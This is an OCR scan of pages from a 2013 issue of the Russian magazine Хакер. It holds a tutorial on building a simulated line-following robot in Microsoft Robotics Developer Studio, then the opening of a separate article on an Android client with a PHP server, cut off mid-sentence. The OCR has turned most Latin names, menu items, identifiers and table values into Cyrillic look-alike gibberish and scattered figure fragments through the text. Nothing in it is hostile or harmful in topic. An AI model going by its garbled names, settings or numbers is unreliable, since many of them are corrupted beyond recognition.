Рис. 1. Список манифестов 



096 



ХАКЕР 01 /168/2013 



© .Ю Напсоск й Ніскг.сот 




Стань робототехником! 




Рис. 2. Настройка сервиса 



Состояние 

сенсоров 




Энергия, подаваемая на 


Положение робота 


левое 

колесо 


правое 

колесо 

0,1 *к 


001 


линия правее робота 


к 


010 


роботнадлинией 


0,5*к 


0,5*к 


011 


линия правее робота 


0,5*к 


0,1 *к 


100 


линия левее робота 


0,1* к 


к 


110 


линия левее робота 


0,1 *к 


0,5*к 


101,111,000 


роботпотеряллинию 


0,3*к 


0,2*к 



Таблица 1. Правила управления роботом 



в симуляторе, ты сможешь, немного изменив на- 
стройки диаграммы, использовать ее для управ- 
ления реальным роботом (обычно изменения 
связаны с калибровкой сенсоров и настройкой 
моторов). Более того, разработанная диаграмма 
может использоваться (с незначительными из- 
менениями) с разными типами роботов. 

Блоки, которые можно разместить на диа- 
грамме, бывают двух видов: 





Ыііе$рЬеге 


1-д 


доігіепсарзиіе 


1-0 


дгеуЬох 


і~о 


дгошгі 


ф-П 


1 1 


г а 


МашСатега 




Зку 


НП 


ЗігееіСопе 


Г~! 
1 1 


5ип 


-О 


ІехЬох 


-ѳ 


іехсар$ц!е 


1-0 


ІехарЬеге 



ІРоЬоіСгеаІе 

ІРоЬоЮгааіеМоІогВааа 

ЕЛЕлиу 

Розіііоп 

в моѵвхгг 

Х 2 © МоѵеХ2 

V -0.001 МоѵеХ 



2 0.005 

Коіаііоп 

X о 

У -0.025 
2 0 



С МоѵвѴ 
© Моѵе2 
С КоІЛеХѴ2 
© ЯоІэІеХ 
С РоІаІеѴ 
© РоіаІе2 



Рис. 3. Параметры объекта 



1 . Вазіс Асііѵііу (базовый блок) — используется 
для управления процессом выполнения диа- 
граммы (проверка условия, вычисление выра- 
жений, определение констант и так далее). 

2. Бегѵісе (сервис) — предназначен для управле- 
ния реальным роботом или роботом в симуля- 
торе. Каждый сервис, в отличие от базового 
блока, имеет уникальное имя. 

Блок (сервис или базовый блок) обрабаты- 
вает данные, поступающие на его вход, а также 
возвращает результаты своей работы на выхо- 
ды. Блок имеет два типа выходов: 

а) результирующий выход— используется 

для получения результатов обработки блоком 
входных данных (обозначается треугольником 
красного цвета); 

б) уведомляющий выход— используется для по- 
лучения информации об изменении внутрен- 
него состояния блока, например для сервиса 
(обозначается кругом красного цвета). 

Процесс выполнения диаграммы состоит 
в том, что блоки последовательно (или парал- 
лельно) обмениваются сообщениями. Блок 



активируется только тогда, когда на его вход 
приходит сообщение. Сообщения в ѴРІ_ похожи 
на структуры в языках РазсаІ или С. Сообщение 
включает поля, каждое из которых описывается 
именем и типом данных. 

ОПИСАНИЕ ЗАДАЧИ 

Пока ты еще не обзавелся личным роботом, 
давай потренируемся на симуляторе. 

В симуляторе на горизонтальной поверх- 
ности размещается робот и линия. Условимся, 
что линия темнее поверхности. Задача робота — 
максимально быстро перемещаться по линии 
от старта до финиша. Для движения по линии 
в состав робота должен входить один или не- 
сколько сенсоров яркости. В бинарных терминах 
сенсор яркости может находиться в двух со- 
стояниях: 

1. 0— сенсор находится над линией. 

2. 1 —сенсор находится за пределами линии. 

Допустим, что значение яркости, измерен- 
ное сенсором, находится на отрезке [0; 1], тогда 
определить состояния сенсора можно с помо- 
щью следующих правил: 




Рис. 4. Среда разработки 



ХАКЕР 01 /168/2013 



097 






кодинг 



Координаты Направление 



№сенсора/ 

параметр 


1 


2 3 1 


2 


3 


X 


-0,1 


0,1 0 -90 


-90 


-90 


У 


0,15 


0,15 0,15 0 


0 


0 


1 


-0,2 


-0,2 -0,2 0 


0 


0 



Таблица 2. Параметры сенсоров 

Для сенсоров используются следующие обозначения: 

1 — 5ітиІаІегіВгідЫпе555еп$огЕпіКу[1]; 

2 — $ітиІаІе<1ВгідМпе555еп50гЕпМу[2]; 

3 — 5ітиІаІесІВгідМпе5$5еп$огЕпІіІу[з]. 

а) если яркость > 0,6, то сенсор находится 
за пределами линии; 

б) если яркость < 0,6, то сенсор находится над 
линией. 

Пороговое значение для различения яркости 
линии и поверхности (в рассматриваемом нами 
случае порог равен 0,6) вычисляется опытным 
путем. 

Пусть робот оснащен дифференциальным 
приводом (в состав такого привода входят два 
независимо управляемых колеса и пассивное 
колесо, используемое для баланса) и тремя 
сенсорами яркости. В табл. 1 на предыдущей 
странице приведены правила для управления 
роботом, в зависимости от состояний сенсоров 
(к — базовый уровень энергии, подаваемой 
на левое и правое колеса). 

При указанной конфигурации сенсоров один 
сенсор устанавливается по центру робота (над 
линией), два других — по бокам робота (не над 
линией). 



Ей* дгеуЬох 



□и 



Сгмп 


0.2 




0.2 


В ОЛимСоЮг 


0.50. 0.50. 0.50. 1.00 




1 


Вие 


0.5 


Омп 


0.5 


ЯеО 


0.5 


В Ея***ѵ«Соку 


О.ОО. О.ОО. О.ОО. 0.00 




0 


Ѳк* 


0 


От п 


0 


ЯеО 


0 


Р©*«г 


64 


В ЗреаіагСоіог 


1.00. 1.00. 1.00. 1.00 




1 


Вив 


1 


Омп 


1 


ЯеО 


1 


В Ме*Яоиьоп 


0. 0.0 


X 


0 


У 


0 


г 


0 


В Ме*$с*« 


1. 1. 1 


X 


1 


У 


1 


2 


1 


В Ме«НТгап«иьоп 


0. 0.0 


X 


0 


У 


0 


г 

В ЗЪаре 


0 







т • 



ВохЗЬлре 

Вох *Нлрв ѴаМ і по МЬепНлре пИапсе л 



Рис. 5. Параметры дгеуЬох 



РАЗРАБОТКА ДИАГРАММЫ 

Давай рассмотрим процесс разработки диаграм- 
мы управления роботом. Он состоит из следую- 
щих шагов: 

1 . Создание сцены, которая будет содержать 
робота и линию. 



дгеуЬох 


С] ! 


згоцгкі 


Ѳ{§ 


■1 Иѵ і;* Ъ 






1 ВоЬоіСгеаЕе ВцтрегІ_еК 






1 РоЬоіСгеаІе ВитрегР»дЫ 






$*тиІаЕе<1 ВпдКпе$$ $еп$огЕг<(1у ( 1 ] 




-О 


$ююІаІе<і ВпдЫпе5$5еп$огЕл«у [2] 




-о 


&ти1Ле<1ВпдЬГпе5$$еп$огЕл1Лу(3) 


1 О і 


МатСатега 


ѳа і 


М<ЛогВа$е ѴУ«Ь Опѵе 




о 


5<тцІаІе<і ВпдЫпе$$ $еп$огЕШ«у 




о 


5ітц!аІе<іСоІог$еп$огЕлІ*у 




в 


5ітцІаіе<іСотра$$ Ел«у 




□ 


5»тіаІе<іСР$ЕлМу 




в 


5»ттІаІе<ЯРЕлМу 




: Ѳ 


5*пцІаІе<ЛРРЕлМу 




: ѳ 


$*тюІаІе<1 $опагЕлМу 




чп 


5ітцІаІе<і ѴѴеЬсат ЕШНу 



О 5ку 
О 5ип 



2. Подключение к роботу сенсоров яркости. 

3. Программирование робота на движение вдоль 
линии. 

СОЗДАНИЕ СЦЕНЫ 

Формирование сцены начни с запуска симуля- 
тора и вставки в сцену робота. МР05 поддер- 
живает несколько моделей роботов. К их числу 
относится іРоЬоІ Сгеаіе. Модель этого робота 
будет использоваться в сцене. 

Помести на диаграмму сервис Бітиіаіесі- 
бепегісОіКегепІіаЮгіѵе (5600 и открой свой- 
ства созданного сервиса (панель Ргорегііез, 
пункт меню Ѵіеѵѵ — » ТооІЬохез -» Ргорегііез). 

В поле СопКдигаІіоп нужно выбрать пункт ІІзе 
а тапйезі. Нажми кнопку «Ітрогі» и выбери 



в списке манифест ІРоЬоІ.СгеаІе.ЗітиІаІіоп. 
Мапйезі.хті (см. рис. 1 и рис. 2). Выбранный 
манифест определяет робота и сцену, которые 
будут добавлены в симулятор. 

После установки значений переменных за- 
пусти диаграмму на выполнение, нажав клавишу 
<Р5>. На экране появится окно, в котором будет 
отображаться ход выполнения диаграммы, так- 
же запустится симулятор. Остановить выполне- 
ние диаграммы можно, закрыв диалоговое окно 
Рип или нажав в этом окне кнопку «5іор». 

После запуска симулятора приступай к фор- 
мированию сцены. Открой редактор симулятора: 
пункт Мосіе -+ Есііі главного меню окна. В левой 
части редактора есть список объектов сцены 
и свойства выделенного объекта. Объект можно 




Рис. 6. Результат вставки сенсоров 



Рис. 7. Первая часть диаграммы 



098 



ХАКЕР 01 /168/2013 






Стань робототехником! 




Рис. 8. Диалог Соппесііопз 



РОБОТЫ, ПОДДЕРЖИВАЕМЫЕ МВБ5 



• І.Е60 Міпсізіогтз— конструктор для созда- 
ния робота. В состав конструктора входят 
сенсоры, сервоприводы, программируемый 
блок( доо.дІ/іиТМс ). Цена — от280 долла- 
ров. 

• іРоЬоіСгеаІе— робот, разработанный 
компанией ійоЬоі на базе платформы 
робота-пылесоса РоотЬа. Робот включает 
дифференциальный привод, набор сенсо- 
ров. Программный интерфейс позволяет 
управлять поведением робота: считывать 



информацию с сенсоров, управлять при- 
водом, выполнять звуковые команды І доо. 
дІ/хОіиг ). Цена — от127 долларов. 

• Вое-Воі— набор электронных компонентов, 
из которого можно собрать робота. В состав 
набора входятпрограммируемый микро- 
контроллер, провода, резисторы, конден- 
саторы, транзисторы, фоторезисторы, 
инфракрасный датчик, датчик давления, 
алюминиевая рама, два сервомотора и ко- 
леса( доо.дІ/38ЬИ І. Цена— от 160 долларов. 



отметить на сцене, выделив его в списке объ- 
ектов и нажав клавишу <СігІ>. Для перемещения 
выбранного объекта можно использовать меню 
в левой нижней части окна редактора. 

Удали со сцены все объекты, кроме дгеуЬох, 
дгоипб, ІРоЬоіСгеаІеМоІогВазе, МаіпСатега, 

5ку и Бип. Объект дгеуЬох будет использоваться 
в качестве основы для линии. Выдели этот объ- 
ект в списке, скопируй его и вставь в симулятор. 
Координаты созданной копии объекта дгеуЬох 
будут такие же, как и у исходного объекта (то 
есть исходный объект и копия будут пере- 
крываться в пространстве). Изменить размеры 
созданного объекта можно следующим образом: 

1 . Выдели дгеуЬох в списке объектов. 

2. Нажми на кнопку «ЕсМ Епіііу», откроется окно, 
показанное на рис. 5. 

3. В пункте ВохБЬаре (раздел БЬаре) нажми 

на «...», на экране откроется окно, в котором, 
в разделе Оітепзіопз, можно будет изменить 
размеры объекта. 

Создаваемая линия должна находиться 
на горизонтальной поверхности, однако робот 
не должен взаимодействовать с ней. Чтобы 
определить такое поведение, открой окно, 
в котором находятся параметры объекта 
дгеуЬох (опять же см. рис. 5), перейди в раз- 
дел Мізс (Разное) -» ЕпііІуБіаІе и в пункте 
Мізс (Разное) -> РІадв установи два флага: 
Кіпелпаііс и 0ізаЫеСоІІІ5Іопз. Это позволит 
вручную указать координаты объекта на сцене, 
а также определить, что с данным объектом 
не будут взаимодействовать другие объекты 
сцены. Используя описанный прием, размести 
блоки так, чтобы они образовали замкнутую 
линию. Пример сцены находится в проекте на 
диске. 

После создания сцены помести робота над 
линией. Сохрани созданную сцену, выбрав 
пункт меню Рііе -» Баѵе Бсепе аз... (имя файла 
для сохранения — Ііпе). В результате будут 
сгенерированы два файла — Ііпе.хтІ и Ііпе. 
Мапгіезі.хті. Сохранять сцену нужно в ката- 
лог установки МР05. Файл Ііпе.хтІ включает 
описание сцены и объектов, которые в ней на- 
ходятся, Ііпе.МапгіезІ.хтІ — описание исполь- 
зуемых сервисов. Если не сгенерирован первый 



файл, то второй использовать будет нельзя, так 
как он ссылается на первый. 

Открой сохраненную сцену (файл Ііпе. 
МапгіезТхтІ) в программе 055 Мапйезі Есіііог 
(данная программа входит в МР05) и пересохра- 
ни ее в тот же каталог. Исходный и пересохра- 
ненный файлы отличаются содержимым. Закрой 
редактор манифеста. Закрой среду ѴРІ_ и снова 
открой в ней созданную диаграмму (данное 
действие нужно выполнить для того, чтобы ѴР(_ 
перезагрузил список манифестов). В панели 
Ргорегбез свяжи сервис 5600 с манифестом 
Ііпе.МапйезІ.хтІ. 

ДОБАВЛЕНИЕ СЕНСОРОВ К РОБОТУ 

После создания сцены можно приступить к на- 
стройке робота. В состав іРоЬоІ не входит сенсор 
яркости, однако среда МР05 позволяет подклю- 
чить к роботу сенсор. Для этого: 

1. Запусти симулятор. 

2. Открой в симуляторе манифест \затрІез\ 
сопбд\ЕпЫуІЛ.тапі(е5І.хтІ (Рііе — > Ореп 
Мапйезі). 

3. На экране появится окно вставки в сцену 
робота. Нажми в открывшемся окне кнопку 
«Асісі Моіог Вазе». В результате в сцену будет 
вставлен робот. 

4. В симуляторе перейди в режим ре- 
дактирования. В списке объектов до- 
бавленного робота выбери сенсор 
ЗітиІаІесіВгідМпеззЗепзогЕпМу и скопируй 
его (Есііі -» Сору). В списке объектов вы- 
бери пункт ІРоЬоіСгеаІеМоІогВазе и добавь 
скопированный сенсор к роботу, используя 
пункт меню ЕсМ -» Разіе аз СЬіІсІ (см. рис. 6). 
Добавление сенсора как дочернего объекта 
связывает его с родительским объектом. 

В этом случае дочерний объект будет пере- 
мещаться по сцене вместе с родительским. 
Добавь таким же образом к роботу еще два 
сенсора яркости. 

5. Перейди в режим Кип и сохрани полученную 
сцену. После этого открой сцену в программе 
Э55 Мапі^езі ЕсМог и сохрани загруженный 
манифест подтем же именем (пункт меню 

Рііе — ► Сохранить). После сохранения получен- 
ный манифест можно использовать при раз- 
работке диаграммы. 



Вставленные сенсоры не визуализируются 
на сцене. Для обозначения сенсора на сцене 
можно загрузить для него графическую модель, 
например Аггоѵѵ.оЬі (данная модель входит в по- 
ставку МР05). 

Открой окно параметров объекта 5ітиІа- 
ІебВгідМпеззБепзогЕпМу, перейди в раздел 
Мізс (Разное) -> ЕпМу5іаІе и в пункте бгарЬіс 
Аззеіз -> МезЬ укажи, что графическая модель 
для сенсора загружается из файла Аггоѵѵ.оЬ]. 
После визуализации сенсора можно увидеть, 
как сенсор располагается относительно робота, 
а также наглядно выполнить его перемещение 
по сцене. Координаты каждого сенсора и их на- 
правления в пространстве приведены в табл. 2. 

РАЗРАБОТКА УПРАВЛЯЮЩЕЙ 
ДИАГРАММЫ 

Согласно поставленной задаче, диаграмма 
должна предоставлять возможность запускать 
и останавливать движение робота, а также 
учитывать время движения робота. Условно 
диаграмму управления роботом можно разбить 
на три части: 

1. Первая часть включает блоки для инициали- 
зации переменных, учета времени движения 
робота и его отображения. 

2. Вторая часть отвечает за запуск и остановку 
движения робота. 

3. Третья часть выполняетуправление движени- 
ем робота на основе показаний сенсоров. 

Рассмотрим переменные, необходимые 
для реализации алгоритма: 

• сігіѵе (тип ЬооІ) — используется для разреше- 
ния или запрета движения робота; 

• к (тип іпі) — используется для управления 
энергией, подаваемой на колеса робота; 

• бте (тип іпі) — время движения робота; 

• І_еК, РідМ, Сепіег (тип ЬооІ) — описывают 
состояние левого, правого и центрального 
сенсоров яркости. 

Добавить переменные на диаграмму можно с по- 
мощью диалогового окна Ребпе ѴагіаЫез (ЕсМ — > 
ѴагіаЫез). 

Блоки, относящиеся к первой части, по- 
казаны на рис. 7. С помощью пары блоков йаіа 



ХАКЕР 01 /168/2013 



099 



кодинг 



Ыате 


РІехіЫеОіаІод 

СопЯдигаЬоп: 


5еі ітиаі сопЬдигаиоп 




- 


5е«тд5 






- РіехОіаІодВіаіе 






ТШе 






Ѵ*.Ые 




0 


Ѳ Солггоі* 




(Соцп» 1]+ 


Ѳ РіехСопігоі 




X 


и 


ііте 




СомгоНуре 


ІаЬеі 


- 


Тел 


Время 0 




Ѵаіие 






Ѳ Ви«оп$ 




(Соипі 2] + 


Ѳ РіехВиПоп 




X 


и 


г*п 




СоЩгоНуре 


ВиПоп 


- 


Тел 


Старт 




Ѵаіие 






1= РІехВиПоп 




ггт; * 


ІО 


лор 




СопігоіТуре 


ВиПоп 


- 


Тел 


Стоп 




Ѵаіие 







Рис. 9. Настройка РІехіЫеОіаІод 




(1) и ѴагіаЫе (2) устанавливается значение 
переменной к. Оаіа хранит число, которое будет 
записано в переменную к. При активации блока 
Оаіа значение, находящееся в текстовом поле, 
помещается в сообщение ОаІаѴаІие (поле Ѵаіие) 
и отправляется на вход блока ѴагіаЫе. Далее 
блок ѴагіаЫе с помощью действия БеіѴаІие уста- 
навливает значение переменной к. Для пере- 
дачи сообщения от Оаіа к ѴагіаЫе соедини эти 
блоки. Появится диалог создания связи между 
блоками (Соппесііопз). В диалоге Соппесііопз 
(см. рис. 8) указывается исходящее сообщение 
блока (поле Ргот) и действие (поле То), на вход 
которого сообщение отправляется. Сообще- 
ние ОаІаѴаІие передается с выхода блока Оаіа 
на вход действия БеіѴаІие блока ѴагіаЫе. 

Соедини ѴагіаЫе (2) и Оаіа (3). Управление 
движением робота (запуск, остановка), а также 



отображение времени движения робота вы- 
полняется в диалоговом окне, которое создается 
сервисом РІехіЫеОіаІод. Помести данный сервис 
на диаграмму и сконфигурируй его в панели 
Ргорегііез так, как показано на рис. 9. 

В диалоговое окно можно поместить компо- 
ненты двух видов: управляющие элементы (раз- 
дел Сопігоіз панели Ргорегііез) и кнопки (раздел 
Виііопз). Элементы управления размещаются 
в диалоговом окне в той же последовательности, 
в какой они были созданы в панели инстру- 
ментов Ргорегііез. Параметр Ісі используется 
для программного управления элементом. 

После настройки РІехіЫеОіаІод будет содер- 
жать две кнопки и статический текст. Для ото- 
бражения диалогового окна на экране нужно 
вызвать метод БЬоѵѵ, передав ему в качестве 
параметра значение Ігие. Данное действие вы- 
полняется с помощью блоков (3) и (4). 

При соединении Оаіа (3) и РІехіЫеОіаІод (4) 
открывается диалоговое окно Соппесііопз, в ко- 
тором нужно указать, что сообщение с выхода 
блока Оаіа отправляется на вход действия БЬоѵѵ 
сервиса РІехіЫеОіаІод. Далее на экране появит- 
ся диалоговое окно Оаіа Соппесііопз (рис. 10), 
в котором нужно установить соответствие между 
полями сообщения (Ѵаіие) и параметрами вы- 
зываемого действия (Тагдеі). 

Результатом выполнения сервисом 
РІехіЫеОіаІод действия БЬоѵл/ может быть 
Биссезз или РаиІІ. Поэтому при создании связи 
между блоками РІехіЫеОіаІод и Оаіа укажи, 
что в случае успешного отображения диалогово- 
го окна на экране (БЬоѵѵ — Биссезз), управление 
будет передано блоку Оаіа. Для этого передай 
сообщение БЬоѵѵ — Биссезз на вход действия 
Сгеаіе блока Оаіа. 

Соедини блоки Оаіа (5) и ѴагіаЫе (6) для уста- 
новки значения переменной сігіѵе. Во второй 
строке диаграммы инициализируется значение 
переменной Ііте и устанавливается таймер 
на срабатывание через 1000 миллисекунд. 

Соедини Оаіа (1) и ѴагіаЫе (2), ѴагіаЫе 
(2) и Оаіа (3). Блок Оаіа (3) нужно соединить 
с блоком II (4) (примечание: блок Мегде будет 
добавлен позднее). Блок II, в зависимости 
от истинности или ложности условия, задан- 
ного в текстовом поле, отправляет сообщение, 
полученное на вход, на первый или второй 
выход. Если условие оказывается истинным, 
то входящее сообщение передается на первый 
выход, если ложно — на второй (ЕІзе). При за- 
писи условия могут использоваться логические 
операторы, показанные в соответствующей 
таблице. 

В рассматриваемой диаграмме блок И 
анализирует значение переменной сігіѵе (доступ 
к значению данной переменной выполняется 
с помощью выражения зіаіе. сігіѵе). В случае 
истинности значения переменной таймер 
устанавливается на срабатывание через 1000 
миллисекунд. 

Соедини II (4) и Тітег (5). Сервис Тітег слу- 
жит для генерации сообщений через указанный 
промежуток времени. При соединении блоков (4) 
и (5) укажи, что вызывается действие БеіТітег. 
Данное действие запускает таймер, который 



Соппесііопз: 

Ргот: То: 

ТгиеСЬоісе БеіТітег 

ОаІаСоппесІіопз: 

Ѵаіие Тагдеі 

1000 Іпіегѵаі 

Таблица 3. Параметры соединения II и Тітег 



Соппесііопз: 

Ргот: То: 

БеіѴаІие ІІрсІаІеСопІгоІ 

ОаІаСоппесІіопз: 

Ѵаіие Тагдеі 

“Ііте" Ш 

РІехСопІгоІТуре.І_зЬеІ СопІгоІТуре 

"Время:“ + 5іа1е.1іте Техі 

Ѵаіие 

Таблица 4. Параметры соединения ѴагіаЫе и РІехіЫеОіаІод 



Соппесііопз: 

Ргот: То: 

СаІсиІаІесіРезиІІ БеЮгіѵеРоѵѵег 

ОаІаСоппесІіопз: 

Ѵаіие Тагдеі 

Ѵаіие І_еІіѴѴЬееІРоѵѵег 

Ѵаіие РідЫѴѴЬееІРоѵѵег 

Таблица 5. Параметры соединения Саісиіаіе и 5000 



Соппесііопз: 

Ргот: То: 

ТгиеСЬоісе БеЮгіѵеРоѵѵег 

ОаІаСоппесІіопз: 

Ѵаіие Тагдеі 

зіаіе. к І_еІІѴѴЬееІРоѵѵег 

О.ГзІаІе.к РідЫѴѴЬееІРоѵѵег 

Таблица 6. Параметры соединения II и 5000 

должен сработать через указанный промежуток 
времени (см. параметр Іпіегѵаі в диалоговом 
окне Оаіа Соппесііопз). Параметры соединения 
блоков приведены в табл. 3. 

Для того чтобы указать значение 1000 
в поле Ѵаіие, установи флажок «Есііі ѵаіиез 
сіігесііу» в нижней части диалогового окна Оаіа 
Соппесііопз. Помести на диаграмму блоки, раз- 
мещенные в третьей строке, и соедини уведом- 
ляющий выход сервиса Тітег (1) и вход блока 
Саісиіаіе (2). В результате на вход Саісиіаіе 
будет отправлено сообщение ТітегСотрІеІе. 
Соедини блоки СаІсиІаІе(2) и ѴагіаЫе (3). 

По истечении 1000 миллисекунд таймер 
срабатывает и генерируется уведомляющее 



100 



ХАКЕР 01 /168/2013 






Стань робототехником! 



сообщение ТітегСотрІеІе. Далее управление 
передается на блок Саісиіаіе, который прибав- 
ляет к текущему значению переменной Ііте 
единицу и отправляет полученное значение 
на выход блока. Блок ѴагіаЫе обновляет зна- 
чение переменной Ііте. 

Для изменения значения времени в диало- 
говом окне нужно вызвать метод ІІрбаІеСоЫгоІ 
сервиса РІехіЫеОіаІод. Для этого тебе нужно 
соединить блоки ѴагіаЫе (3) и РІехіЫеОіаІод 
(4). Параметры соединения приведены в табл. 

4 слева. 

Таймер, установленный с помощью БеСПтег, 
может сработать только один раз. Для того 
чтобы таймер срабатывал периодически, между 
второй и третьей строкой с помощью блока 
Мегде создана связь. Блок Мегде отправляет 
на свой выход сообщение сразу, как только оно 
приходит на его вход. В результате после сраба- 
тывания таймера сообщение снова отправляется 
на вход сервиса Тітег. 

Рассмотрим вторую часть диаграммы (см. 
рис. 1 1 ). В данной части диаграммы выполня- 
ется обработка нажатий кнопок диалогового 



окна и отправка управляющих команд на запуск 
и остановку движения робота. Размести на диа- 
грамму блоки, показанные на рис. 11. Соедини 
уведомляющий выход сервиса РІехіЫеОіаІод 
и блок К, отправив на вход К сообщение 
ВииопРгеБ5. 

Условия, указанные в полях блока К, по- 
зволяют определить кнопку, которая была 
нажата в диалоговом окне. Если нажата кнопка 
«Старт», тогда: 

• в переменную бгіѵе записывается значение 
Ігие и запускается счетчик времени движения 
робота; 

• с помощью сервиса 5600 роботу отправляется 
команда на движение (для этого вызывается 
метод БеШгіѵеРоѵѵег). Метод БеШгіѵеРоѵѵег 
задаетзначение энергии, подаваемое на ле- 
вое и правое колеса робота. Параметры со- 
единения блоков Саісиіаіе и 5600 приведены 
в табл. 5. 

Если нажата кнопка «Стоп», тогда сервис 5600 
останавливает движение робота, в переменную 
бгіѵе записывается Іаізе. 



В третьей части диаграммы (см. рис. 12) 
выполняется обработка данных от сенсоров 
и управление движением робота. Для доступа 
к сенсору яркости робота используется сервис 
5ітиІаІебРЬоІоСеІІВгідЫпе555еп$ог. Данный 
сервис периодически запрашивает у сенсора 
данные и отправляет их на свой выход в уве- 
домляющем сообщении Апаіодбепзогіірсіаіе. 
Сообщение Апаіодбепзогіірсіаіе содержит поле 
ІМогтаІігебМеазигетеЫ, которое хранит зна- 
чение яркости, считанное сенсором (значение 
нормализовано на отрезке (0; 1]). 

Добавь на диаграмму три сервиса 5ітиІа- 
ІебРНоІоСеІІВгідЫпеззбепзог. При добавлении 
второго и третьего сервисов на экране появится 
диалоговое окно, в котором укажи, что созда- 
ется новый сервис (выбери пункт «Абб а пеѵѵ 
асііѵііу»), а не копия существующего. 

Свяжи каждый сервис 5ітиІа1есІРЬоІоСеІІ- 
ВгідЫпеззбепзог с сенсором яркости. Для этого 
в панели Ргорегбез для сервиса 5ітиІа1есі- 
РЬоІоСеІІВгідЫпеззбепзог необходимо указать, 
что он связан с «зітЬгідЫпеззепзогО іп Ііпе. 
МапіІе5І.хтІ», сервис 5ітиІа1есіРЬоІоСеІІВгідЬ 
ІпеззбепзогО — с «зітЬгідЫпеззепзогІ іп Ііпе. 
Мапііезі.хті», сервис 5ітиІаІебРЬоІоСеІІВгідЬ 
Іпеззбепзогі — с «зітЬгідЫпеззепзог іп Ііпе. 
Мапііезі.хті». 

Значение каждого сенсора анализируется 
в блоке Саісиіаіе. Если значение яркости больше 
0,6, то значение переменной (1_еД, РідЫ или 
СеЫег), связанной с сенсором, устанавливается 
в 1, иначе — в 0. Далее на основе полученных 
значений переменных І_еК, РідЫ и СеЫег с по- 
мощью блоков К и 5600 устанавливается коли- 
чество энергии, подаваемое на левое и правое 
колеса робота. Параметры соединения первого 
выхода блока II и сервиса 5600 приведены 
в табл. 6. Остальные настройки связи блоков II 
и 5600 выполни сам, используя табл. 1. Запусти 
разработанную диаграмму на выполнение, 
в результате будет открыт симулятор со сфор- 
мированной сценой и робот начнет движение 
по линии. 

После запуска среда разработки активирует 
блоки Оаіа, находящиеся в первой строке. Да- 
лее запускается процесс установки таймеров 
и обработки данных, поступающих от сенсоров, 
на экране отображается симулятор и диалого- 
вое окно управления роботом. После нажатия 
на кнопку «Старт» робот начинает движение 
вдоль линии, запускается отсчет времени. По- 
сле нажатия на кнопку «Стоп» робот останав- 
ливает движение, отсчет времени приостанав- 
ливается. 

ЗАКЛЮЧЕНИЕ 

Описанный в статье способ создания сцены 
и управления составом сенсоров робота по- 
зволяет решать достаточно сложные и разно- 
образные задачи (например, обход лабиринта, 
керлинг и так далее). 

Кроме того, значительно повысить уровень 
сложности решаемых задач позволит совмест- 
ное использование МісгозоІІ РоЬоІісз Эеѵеіорег 
5іис1іо и ѴізиаІ С#. Однако это, как говорится, 
уже совсем другая история, и 




& 



$«Юг»ѵеРоѵге» 1 





Оліл 




ВЭН 

Ьооі - 1 




► ►Ійг.ѵ* - 



Рис. 1 1 . Вторая часть диаграммы 



ча» ч* &4 чаи ал <ш« 



чаи >.**! 44 «аи С**ч*» 44 чаи А-дм 



Чаи 44 іач С ««и* 44 *аи АідМ 



•аи іе* 44 пт С«м«* 44 чаи Аідм 



»аи і«*і 44 іии 44 іии А.д*: 




► ► 



► ► 



МймЬ т * 



ММиАмм # 



МО) І0ЙИМ* ► 



Рис. 12. Третья часть диаграммы 



ХАКЕР 01 /168/2013 



101 











кодинг 



Денис Колисниченко |ѵтѵѵ.гікѵѵ5.огд.иа) 




Апсігоісі — довольно продвинутая платформа, 
и для нее можно разрабатывать самые 
разные приложения. Сегодня мы рассмотрим 
пример создания относительно простого 
клиент-серверного приложения. Мы научим 
наше Апсігоісі-приложение обмениваться 
информацией с сервером и даже напишем 
большое серверное приложение на РНР. 

КАК ЭТО БУДЕТ РАБОТАТЬ? 

Представим, что где-то в Сети у нас есть сервер баз данных и мы 
хотим получить из него информацию, которая будет отображена 
в АпсігоісІ-приложении. Серверное приложение будет реализовано 
на РНР (можно сделать это на любом языке программирования). 
Апсігоісі-клиент будет подключаться к нашему серверу (к РНР- 
сценарию), передавать информацию (команду), получать результат 
и отображать его. При этом не нужно ломать голову, как подклю- 
чить Апсігоісі-приложение к Огасіе. С базой данных будет рабо- 
тать РНР-сценарий, а Апсігоісі-кл иент будет только указывать, 
какую информацию нужно получить, и отображать ответ сервера. 
При этом вообще не нужно беспокоиться о поддержке баз данных 
в Апсігоісі: вся необходимая поддержка будет обеспечиваться РНР. 
Не говоря уже о том, что с легкостью можно менять сам сервер баз 
данных: сегодня Огасіе, завтра РозІдгеБСИ или Му5С!І_, если уж 
совсем тяжело. А Апсігоісі-кл иент при этом не нужно будет вообще 
никак модифицировать. Никакой магии, только ловкость рук! 

Это очень удобно, когда у тебя есть какой-то ресурс, тысячи 
пользователей, скачавших Апсігоісі-клиенты, а потом тебе при- 
шлось сменить сервер баз данных. Тогда тебе останется только 
немного изменить РНР-сценарий. 

При чтении этой статьи тебе понадобятся навыки программи- 
рования на РНР, базовые знания Эаѵа (и умение создавать проекты 



типа НеІІо ѴѴогІсі в Есіірзе), а также общее понимание модели 
клиент-сервер, дабы разбираться, что вообще происходит. Еще раз 
отмечу: создание Апсігоісі-приложения будет происходить в Есіірзе, 
поэтому наличие этой среды, а также уже установленного Апсігоісі 
БОК на твоем компьютере — обязательное требование. 

РАЗРАБОТКА СЕРВЕРНОГО ПРИЛОЖЕНИЯ 

Серверная часть — самая простая, по крайней мере в нашем 
случае. Для упрощения кода никакой работы с БД не будет. Не по- 
думай, что я не умею работать с БД на РНР, просто так код короче (а 
этого постоянно требует редактор!), сама же работа с базой данных 
никак не относится к Апсігоісі-разработке, и серверное приложение 
можно с одинаковым успехом написать на любом языке про- 
граммирования — хоть на РегІ, хоть на С++. А если сократить код 
серверного приложения, останется больше места для полезного 
Эаѵа-кода — именно ему и посвящена эта статья. 

Почему серверная часть написана на РНР, а не на Эаѵа? Думаю, 
ответ очевиден: серверы редко работают под управлением Апсігоісі. 
Если чисто гипотетически вообразить себе сервер, развернутый 
на мобилке, то даже не могу представить, как быстро издохнет его 
аккумулятор. 

Так, стоп, кажется, опять меня понесло не в то русло. Возвраща- 
емся к написанию серверного сценария. Клиент должен передать 
нашему серверу команду (параметр стсі). Пусть команда Іізі выво- 
дит список объектов — операционных систем. В своем приложе- 
нии ты можешь выводить все что угодно, хоть список квартир или 
список автомобилей в продаже. 

Апсігоісі-клиент читает ответ сервера и отображает полученный 
список. Когда пользователь выбирает объект, клиент передает 
на сервер вторую команду — выбранный вариант. Сервер обра- 
батывает выбор пользователя и отправляет свой ответ, который 
будет отображен в виде уведомления в АпсігоісІ-клиенте (во всяком 
случае, в нашем приложении). 

Все предельно просто, но приложение полностью справля- 
ется со своей задачей — демонстрацией модели клиент-сервер 
